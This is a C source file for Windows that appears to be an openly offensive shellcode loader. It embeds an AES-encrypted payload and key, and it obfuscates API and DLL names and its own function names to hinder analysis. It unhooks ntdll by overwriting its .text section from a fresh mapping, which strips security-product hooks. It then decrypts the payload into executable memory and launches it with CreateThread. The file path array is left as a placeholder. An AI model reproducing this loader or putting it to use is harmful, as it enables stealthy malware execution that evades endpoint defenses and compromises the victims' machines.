/*
Author --> acemapper
Please see the readme file to understand the functionality of the code.
Function names have been dubbed to make it more obscure to read.
*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment (lib, "advapi32")

unsigned char payload[] = { 0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
unsigned char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };
unsigned int payload_len = sizeof(payload);

typedef BOOL (WINAPI * QWERTY1)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI * QWERTY2)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * QWERTY3)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * QWERTY4)(LPCVOID);

QWERTY1 XYZ123 = NULL;

unsigned char ABCD[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char EFGH[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

int DECRYPT(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return -1;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return -1;
    if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)) return -1;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return -1;
    
    if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)) return -1;
    
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    
    return 0;
}

void XORFUNC(char str2xor[], size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        str2xor[i] ^= key;
    }
}

static int FIXMODULE(const HMODULE hNtdll, const LPVOID pMapping) {
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOS = (PIMAGE_DOS_HEADER) pMapping;
    PIMAGE_NT_HEADERS NT = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + DOS->e_lfanew);

    for (int i = 0; i < NT->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER SEC = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(NT) + 
                                    ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char *) SEC->Name, ".text")) {
            XYZ123((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) SEC->VirtualAddress),
                   SEC->Misc.VirtualSize,
                   PAGE_EXECUTE_READWRITE,
                   &oldprotect);
            if (!oldprotect) return -1;

            memcpy((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) SEC->VirtualAddress),
                   (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) SEC->VirtualAddress),
                   SEC->Misc.VirtualSize);

            XYZ123((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) SEC->VirtualAddress),
                   SEC->Misc.VirtualSize,
                   oldprotect,
                   &oldprotect);
            if (!oldprotect) return -1;
            return 0;
        }
    }
    return -1;
}

int main(void) {
    unsigned char PATH[] = { /* ... same as original ... */ };
    unsigned char FUNC1[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
    unsigned char FUNC2[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
    unsigned char FUNC3[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
    unsigned char FUNC4[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
    unsigned char LIB[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
    unsigned int PATH_LEN = sizeof(PATH);
    unsigned int DLL_LEN = sizeof(ABCD);

    QWERTY2 CREATEMAP = (QWERTY2) GetProcAddress(GetModuleHandle((LPCSTR) EFGH), (LPCSTR) FUNC1);
    QWERTY3 MAPVIEW = (QWERTY3) GetProcAddress(GetModuleHandle((LPCSTR) EFGH), (LPCSTR) FUNC2);
    QWERTY4 UNMAPVIEW = (QWERTY4) GetProcAddress(GetModuleHandle((LPCSTR) EFGH), (LPCSTR) FUNC3);
    XYZ123 = (QWERTY1) GetProcAddress(GetModuleHandle((LPCSTR) EFGH), (LPCSTR) FUNC4);

    XORFUNC((char *) PATH, PATH_LEN, PATH[PATH_LEN - 1]);
    HANDLE hFile = CreateFile((LPCSTR) PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hMap = CREATEMAP(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) {
        CloseHandle(hFile);
        return -1;
    }

    LPVOID pMapping = MAPVIEW(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return -1;
    }

    int ret = FIXMODULE(GetModuleHandle((LPCSTR) ABCD), pMapping);

    UNMAPVIEW(pMapping);
    CloseHandle(hMap);
    CloseHandle(hFile);

    HMODULE hVictimLib = LoadLibrary((LPCSTR) LIB);
    if (hVictimLib != NULL) {
        char * ptr = (char *) VirtualAlloc(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        printf("ptr: %p\n", ptr); getchar();

        DWORD oldprotect = 0;
        XYZ123(ptr, payload_len + 4096, PAGE_READWRITE, &oldprotect);

        DECRYPT((char *) payload, payload_len, (char *) key, sizeof(key));
        RtlMoveMemory(ptr, payload, payload_len);

        XYZ123(ptr, payload_len + 4096, oldprotect, &oldprotect);

        CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);
        printf("Bye-Bye?\n"); getchar();
    }

    return 0;
}
